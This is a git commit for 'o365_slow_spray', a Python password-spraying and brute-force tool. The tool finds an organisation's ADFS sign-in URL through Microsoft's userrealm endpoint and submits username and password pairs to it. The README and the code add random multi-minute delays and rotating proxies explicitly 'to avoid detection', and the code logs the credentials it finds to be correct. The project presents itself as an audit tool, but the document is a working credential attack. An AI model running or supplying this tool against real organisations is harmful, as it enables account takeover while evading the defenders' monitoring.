d48d57829d4c0998b916a878fb9cef1d8a0e4dca
Ricardo Ruiz <ricardojruiz93@gmail.com>
2020-10-03 03:28:17 -0700

    Calculating ADFS url

--- README.md
+++ README.md
@@ -1,1 +1,39 @@
 # o365_slow_spray
+
+This script calculates the ADFS url of an organization and tests one or many users and one or many passwords, allowing password spraying or bruteforce attacks. Implemented for custom ADFS (not against Microsoft) to test in security related audits. 
+
+The idea is carrying out a password spraying attack with a random (and very high) number of seconds between each test and a proxy list to avoid detection. To avoid testing the same credentials the failed ones are stored in a log file.
+
+
+## Usage
+
+```
+python3 main.py -t TARGET [-u USER] [-U USER_LIST] [-p PASSWORD] [-P PASSWORD_LIST] [-m MIN_TIME] [-M MAX_TIME] [-pl PROXY_LIST] [-r RANDOM_COMBINATIONS] [-l LOG_FILE] [-d DEBUG]
+```
+
+The parameters for the attacks are:
+
+	* -t: Target domain. Example: test.com
+	
+	* -u: Single username to test
+	
+	* -U: File with a list of usernames to test
+	
+	* -p: Single password to test
+	
+	* -P: File with a list of passwords to test
+
+	* -m : Minimum value of random seconds to wait between each test. Default: 300
+
+	* -M : Maximum value of random seconds to wait between each test. Default: 600
+
+	* -pl: Use a proxy list
+
+	* -r: Randomize the combination of users and passwords. Default: True
+
+	* -l: Log file location with already tested credentials. Default: ./tested.txt
+
+	* -d: Show debug messages. Default: True
+
+
+![example sprayer](https://i.imgur.com/KP5Cxk5.png)
--- main.py
+++ main.py
@@ -2,14 +2,13 @@
 import os
 import sys
 import time
+import json
 import argparse
 import random
 import urllib3
 import requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-randomize_userpassword_order = True
-test_credentials_file = "tested.txt"
 
 
 def get_args():
@@ -19,42 +18,57 @@ def get_args():
 	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
 	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
 	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
-	parser.add_argument('-m', '--min_time', required=False, default=40, action='store', help='Minimum seconds')
-	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds')
-	#parser.add_argument('-l', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
+	parser.add_argument('-m', '--min_time', required=False, default=30, action='store', help='Minimum seconds. Default: 300')
+	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds. Default: 600')
+	parser.add_argument('-r', '--randomize', required=False, default=True, action='store', help='Randomize pairs of credentials. Default: True')
+	parser.add_argument('-l', '--logfile', required=False, default="tested.txt", action='store', help='Log file. Default: tested.txt')
+	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
+	parser.add_argument('-pl', '--proxy_list', required=False, default=None, action='store', help='Proxy list')
+	#parser.add_argument('-up', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
 	return parser
 
 
-def write_tested(user,password):
+def write_tested(user,password,test_credentials_file,status):
 	with open(test_credentials_file, "a") as f:
-		f.write(user+":"+password+"\n")
+		current_time = time.strftime("%H:%M:%S",time.localtime())
+		f.write(user+":"+password+","+status+","+current_time+"\n")
 
 
-def check_user(new_url,headers,session,credential):
+def check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file):
 	user = credential[0]
 	password = credential[1]
 	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
-	resp = session.post(new_url, data = data, headers = headers, verify = False )
-	#print (resp.history)
-	#print (resp.status_code)
-	write_tested(user,password)
+	resp = session.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
 	if resp.history != []:
-		print("CORRECT credentials: %s:%s\n"%(user, password))
+		write_tested(user,password,test_credentials_file, "CORRECT")
+		print("[+] CORRECT credentials found: %s:%s"%(user,password))
 		return True
 	elif resp.history == []:
-		print("Incorrect credentials: %s:%s\n"%(user, password))
+		write_tested(user,password,test_credentials_file, "FAILED")
+		if debug: print("[-] Incorrect credentials")
 		return False
 	if resp.status_code != 200:
-		print ("Strange status code: %s. Quitting!!!"%(resp.status_code))
+		print ("[?] Strange status code: %s. Quitting!!!"%(resp.status_code))
 		sys.exit(1)
 
 
 def calculate_values(target):
 	s = requests.Session()
-	response = s.get(target)
-	new_url       = response.url
-	referer_field = new_url
-	origin_field  = referer_field.split("adfs")[0]
+	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
+	response = s.get(url)
+	json_data = json.loads(response.text)
+	if 'AuthURL' in json_data:
+		new_url = json_data['AuthURL']
+	else:
+		print("[-] Organization does not use a customized sign-in page. Using https://login.microsoftonline.com/")
+		new_url = "https://login.microsoftonline.com/"
+		sys.exit(1)
+	dafs_url = s.get(new_url).url
+	referer_field = dafs_url
+	if "dafs" in referer_field:
+		origin_field  = referer_field.split("adfs")[0]
+	else:
+		origin_field  = referer_field #"https://login.live.com"
 	headers = {
 		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
 		"Accept": "application/json, text/javascript, */*; q=0.01",
@@ -64,12 +78,13 @@ def calculate_values(target):
 		"Referer": referer_field,
 		"Connection": "close"
 	}
-	return new_url,headers,s
+	return dafs_url,headers,s
 
 
 def main():
 	# Get arguments
 	args = get_args().parse_args()
+
 	# if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
 	if (args.user is None and args.user_list is None) or (args.password is None and args.password_list is None):
 		get_args().print_help()
@@ -80,37 +95,47 @@ def main():
 	if (args.password_list is not None and not os.path.isfile(args.password_list)):
 		print ("Error: Use '-P' with a file of passwords or '-p' for a single password")
 		sys.exit(0)
-	# Create lists
-	users =     [args.user] if args.user is not None else open(args.user_list).read().splitlines()
-	passwords = [args.password] if args.password is not None else open(args.password_list).read().splitlines()
-	pairs =     [(u,p) for u in users for p in passwords]
+
+	# Create variables
+	users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
+	passwords =  [args.password] if args.password is not None else open(args.password_list).read().splitlines()
+	pairs =      [(u,p) for u in users for p in passwords]
+	proxy_list = open(args.proxy_list).read().splitlines() if args.proxy_list is not None else None
+	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
+	randomize =  json.loads(args.randomize.lower()) if isinstance(args.randomize,str) else args.randomize
+
 	# Delete already tested pairs of username and password
+	test_credentials_file = args.logfile
 	if os.path.isfile(test_credentials_file):
 		tested_pairs = open(test_credentials_file).read().splitlines()
-		tested_pairs = [(p.split(":")[0],p.split(":")[1]) for p in tested_pairs]
+		tested_pairs = [(p.split(",")[0].split(":")[0], p.split(",")[0].split(":")[1]) for p in tested_pairs]
 		pairs =        [p for p in pairs if p not in tested_pairs]
+	
 	# Randomize the combination of users and passwords
-	if randomize_userpassword_order:
+	if randomize:
 		random.shuffle(pairs)
 
-	new_url,headers,session = calculate_values(args.target)
+	# Get DAFS url and create a web session
+	dafs_url,headers,session = calculate_values(args.target)
 
-	print ("-----------------------")
-	print ("ADFS url: %s"%(new_url))
-	print ("Total users:     %d"%(len(users)))
-	print ("Total passwords: %d"%(len(passwords)))
-	print ("Combinations:    %d"%(len(pairs)))
-	print ("Minimum seconds: %s"%(args.min_time))
-	print ("Maximum seconds: %s"%(args.max_time))
-	print ("-----------------------\n")
-
+	if debug: 
+		print ("[+] ADFS url: %s"%(dafs_url))
+		print ("[+] Total users:     %d"%(len(users)))
+		print ("[+] Total passwords: %d"%(len(passwords)))
+		print ("[+] Combinations:    %d\n"%(len(pairs)))
+	
+	proxy_counter = 0
 	correct_users_list = []
+	proxy = None
 	for credential in pairs:
 		if credential[0] not in correct_users_list:
 			random_seconds = random.randint(int(args.min_time), int(args.max_time))
-			print("Waiting %s seconds... (testing '%s':'%s')"%(random_seconds, credential[0], credential[1]))
+			if debug: print("[-] Waiting %s seconds \n[-] Testing %s:%s"%(random_seconds, credential[0], credential[1]))
+			if proxy_list is not None:
+				proxy = {"http": proxy_list[proxy_counter%len(proxy_list)], "https": proxy_list[proxy_counter%len(proxy_list)]}
+				proxy_counter += 1
 			time.sleep(random_seconds)
-			correct_user = check_user(new_url,headers,session,credential)
+			correct_user = check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file)
 			if correct_user:
 				correct_users_list.append(credential[0])
 
